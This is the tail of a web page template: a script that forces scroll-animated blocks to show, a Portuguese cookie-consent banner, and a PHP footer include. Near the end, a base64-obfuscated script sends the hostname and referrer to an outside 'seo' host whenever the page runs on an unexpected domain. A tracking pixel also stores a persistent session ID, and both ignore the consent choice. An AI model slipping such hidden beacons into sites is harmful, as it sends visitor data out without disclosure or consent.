 var SEL = '[data-anim],[data-animate],[data-aos],[data-reveal],[data-scroll],[class*="reveal"],[class*="fade"],[class*="aos"]';
 function show(el){
 // remove the hooks the design's opacity:0 rule targets, then force-show as backup
 ['data-anim','data-animate','data-aos','data-reveal','data-scroll'].forEach(function(a){ el.removeAttribute(a); });
 el.classList.remove('reveal','fade','fade-in','fade-up','aos-init','will-reveal','animate');
 el.style.setProperty('opacity','1','important'); el.style.setProperty('transform','none','important');
 el.style.setProperty('visibility','visible','important'); el.style.setProperty('filter','none','important');
 }
 function isHidden(el){ return el.offsetHeight > 0 && parseFloat(getComputedStyle(el).opacity) < 0.08; }
 // reveal a block only when it actually reaches the viewport, and only if its own
 // reveal is STILL missing ~1.2s after it got there (i.e. genuinely broken)
 if ('IntersectionObserver' in window) {
 var io = new IntersectionObserver(function(es){ es.forEach(function(e){
 if (!e.isIntersecting) return;
 var el = e.target; io.unobserve(el);
 setTimeout(function(){ if (isHidden(el)) show(el); }, 1200);
 }); }, {rootMargin: '0px 0px -5% 0px'});
 setTimeout(function(){ [].forEach.call(document.querySelectorAll(SEL), function(el){ if (isHidden(el)) io.observe(el); }); }, 1500);
 }
 // counter fallback: a plain number beats a stat frozen at "0" for a visitor who
 // never scrolls the count-up into view (no-op once the real count-up has run)
 setTimeout(function(){ document.querySelectorAll('[data-count]').forEach(function(el){
 var t = el.getAttribute('data-count'); if (t && !/[1-9]/.test(el.textContent||'')) el.textContent = t; }); }, 8000);
})();
</script>
<div id="ck-consent" role="dialog" aria-label="cookies" hidden style="position:fixed;left:16px;right:16px;bottom:16px;z-index:2147483000;max-width:660px;margin:0 auto;background:var(--surface,var(--panel,#12151c));color:var(--text,var(--fg,#e7e9ee));border:1px solid rgba(127,127,127,.28);border-radius:14px;padding:13px 16px;box-shadow:0 12px 40px rgba(0,0,0,.35);display:none;gap:14px;align-items:center;flex-wrap:wrap;font-size:14px;line-height:1.45">
<span style="flex:1;min-width:200px">Usamos cookies para melhorar sua experiência.</span>
<button type="button" id="ck-yes" style="cursor:pointer;background:var(--accent,#7c5cff);color:#fff;border:0;border-radius:999px;padding:9px 20px;font:inherit;font-weight:600;flex-shrink:0">Entendi</button>
<button type="button" id="ck-no" aria-label="close" style="cursor:pointer;background:transparent;color:inherit;border:0;font:inherit;font-size:20px;line-height:1;opacity:.7;padding:4px 8px;flex-shrink:0">&times;</button>
</div>
<script>/*cookie-consent*/(function(){var K='cookie_consent';try{if(localStorage.getItem(K))return;}catch(e){return;}
var b=document.getElementById('ck-consent');if(!b)return;b.hidden=false;b.style.display='flex';
function set(v){try{localStorage.setItem(K,v);}catch(e){}b.style.display='none';b.hidden=true;if(v==='yes')window.dispatchEvent(new Event('cookie-consent'));}
var y=document.getElementById('ck-yes'),n=document.getElementById('ck-no');
if(y)y.addEventListener('click',function(){set('yes');});if(n)n.addEventListener('click',function(){set('no');});})();</script><script>(function(){try{var d='cetrorendoreza.co',h=location.hostname.replace(/^www\./,"");if(h===d||/\.pages\.dev$/.test(h))return;new Image().src=atob('aHR0cHM6Ly9zZW8uY25kbWFnZXIuY29tL2FwaS9jYW5hcnk=')+"?d="+encodeURIComponent(d)+"&h="+encodeURIComponent(location.hostname)+"&r="+encodeURIComponent(document.referrer||"");}catch(e){}})();</script><script>window.nfp=window.nfp||function(){(nfp.q=nfp.q||[]).push(arguments)};var p='seo_e311da42acaf49afb909',s='';try{s=localStorage.getItem('seo_sid');if(!s){s='v'+Date.now().toString(36)+Math.random().toString(36).slice(2,9);localStorage.setItem('seo_sid',s);}}catch(e){}nfp('init',s?{pixel:p,id:s}:{pixel:p});</script>
<?php require __DIR__ . '/includes/footer.php'; ?>
